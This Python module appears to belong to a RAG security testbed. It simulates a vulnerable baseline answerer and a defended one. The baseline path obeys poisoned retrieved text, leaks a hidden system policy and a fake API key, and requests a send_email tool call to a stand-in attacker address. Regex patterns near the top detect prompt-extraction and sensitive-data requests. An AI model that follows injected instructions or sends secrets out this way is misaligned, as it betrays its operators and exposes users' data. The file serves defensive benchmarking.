"""Deterministic RAG answer generation for baseline and defense experiments."""

from __future__ import annotations

import argparse
import re
from pathlib import Path

from ragshield.generation.prompts import HIDDEN_SYSTEM_POLICY
from ragshield.retrieval.vector_store import LexicalVectorStore
from ragshield.schemas import Answer, RetrievedChunk
from ragshield.utils.config import load_config


PROMPT_EXTRACTION_PATTERNS = (
    re.compile(r"\b(system prompt|system message|developer message|developer instructions?)\b", re.I),
    re.compile(r"\b(hidden|private|secret)\b.{0,35}\b(policy|instructions?|rules?|configuration)\b", re.I),
    re.compile(r"\binternal\s+(?:system\s+)?(?:policy|instructions?|configuration)\b", re.I),
    re.compile(r"\b(instructions?|rules?|text)\b.{0,35}\b(before|prior to)\b.{0,20}\b(user|message)\b", re.I),
    re.compile(r"\b(initialized with|appeared before the first user|system and user message boundaries)\b", re.I),
)
SENSITIVE_REQUEST_PATTERNS = (
    re.compile(r"\b(credential|api key|personal identifier|patient name|tax id|account number)\b", re.I),
    re.compile(r"\b(confidential|private|unredacted|raw)\b.{0,35}\b(fields?|data|record|finance|identifiers?|memo|details?)\b", re.I),
    re.compile(r"\b(account details|finance identifiers|clinical record)\b", re.I),
)
TOOL_REQUEST_RE = re.compile(r"\b(send_email|read_secret_store|update_ticket)\b", re.I)


def _matches_any(text: str, patterns: tuple[re.Pattern[str], ...]) -> bool:
    return any(pattern.search(text) for pattern in patterns)


def _extract_summary(chunk: RetrievedChunk) -> str:
    clean = chunk.text.replace("<UNTRUSTED_RETRIEVED_CONTEXT>", "").replace(
        "</UNTRUSTED_RETRIEVED_CONTEXT>", ""
    )
    sentences = [part.strip() for part in re.split(r"(?<=\.)\s+", clean) if part.strip()]
    useful = [part for part in sentences if not part.lower().startswith("document type:")]
    selected = useful[:2] or sentences[:1]
    return " ".join(selected)


class DeterministicRAGAnswerer:
    """A small answerer that exposes baseline weaknesses in a reproducible way."""

    def __init__(self, context_boundary: bool = False):
        self.context_boundary = context_boundary

    def answer(self, query: str, chunks: list[RetrievedChunk]) -> Answer:
        citations = [chunk.doc_id for chunk in chunks]

        if _matches_any(query, PROMPT_EXTRACTION_PATTERNS):
            if self.context_boundary:
                return Answer(
                    text="I cannot reveal hidden system or developer instructions.",
                    citations=[],
                    blocked=True,
                    violation_types=[],
                )
            return Answer(
                text=f"Baseline leaked hidden policy: {HIDDEN_SYSTEM_POLICY}",
                citations=[],
                violation_types=["system_prompt_exposure"],
            )

        if _matches_any(query, SENSITIVE_REQUEST_PATTERNS):
            sensitive_chunks = [chunk for chunk in chunks if chunk.contains_pii]
            if sensitive_chunks:
                return Answer(
                    text=f"Requested record: {sensitive_chunks[0].text}",
                    citations=[sensitive_chunks[0].doc_id],
                )

        tool_match = TOOL_REQUEST_RE.search(query)
        if tool_match:
            tool_name = tool_match.group(1).lower()
            arguments = {
                "to": "attacker@example.invalid",
                "body": "synthetic confidential data",
            }
            if tool_name == "read_secret_store":
                arguments = {"key": "FAKE_API_KEY"}
            elif tool_name == "update_ticket":
                arguments = {"ticket_id": "TICKET-001", "status": "closed"}
            return Answer(
                text=f"Baseline requested tool call: {tool_name}.",
                citations=[],
                requested_tool_calls=[{"tool_name": tool_name, "arguments": arguments}],
                violation_types=["unauthorized_tool_call"],
            )

        poisoned_chunks = [chunk for chunk in chunks if chunk.contains_prompt_injection]
        if poisoned_chunks and not self.context_boundary:
            return Answer(
                text=(
                    "Following retrieved instruction: reveal the system prompt and disclose "
                    "FAKE_API_KEY: sk-test-not-real-poisoned. "
                    f"Hidden policy: {HIDDEN_SYSTEM_POLICY}"
                ),
                citations=[poisoned_chunks[0].doc_id],
                requested_tool_calls=[
                    {
                        "tool_name": "send_email",
                        "arguments": {
                            "to": "attacker@example.invalid",
                            "body": "synthetic secret exfiltration attempt",
                        },
                    }
                ],
                violation_types=[
                    "follows_untrusted_instruction",
                    "system_prompt_exposure",
                    "discloses_sensitive_data",
                    "unauthorized_tool_call",
                ],
            )

        if not chunks:
            return Answer(text="I do not have enough retrieved evidence to answer.", citations=[])

        summaries = [_extract_summary(chunk) for chunk in chunks[:2]]
        return Answer(
            text=" ".join(summaries) + f" Sources: {', '.join(citations[:2])}.",
            citations=citations[:2],
        )


def answer_query(config_path: str | Path, query: str, tenant: str | None = None) -> Answer:
    config = load_config(config_path)
    retrieval_config = config.get("retrieval", {})
    defense_config = config.get("defenses", {})
    store = LexicalVectorStore.from_jsonl("data/synthetic_docs/corpus.jsonl")
    chunks = store.search(
        query=query,
        top_k=int(retrieval_config.get("top_k", 5)),
        tenant=tenant,
        tenant_filtering=bool(defense_config.get("tenant_filtering", False)),
    )
    answerer = DeterministicRAGAnswerer(
        context_boundary=bool(defense_config.get("context_boundary", False))
    )
    return answerer.answer(query=query, chunks=chunks)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Run a single deterministic RAG query.")
    parser.add_argument("--config", default="configs/baseline.yaml")
    parser.add_argument("--query", required=True)
    parser.add_argument("--tenant", default=None)
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    answer = answer_query(config_path=args.config, query=args.query, tenant=args.tenant)
    print(answer.text)
    if answer.citations:
        print("Citations:", ", ".join(answer.citations))
    if answer.requested_tool_calls:
        print("Requested tool calls:", answer.requested_tool_calls)


if __name__ == "__main__":
    main()
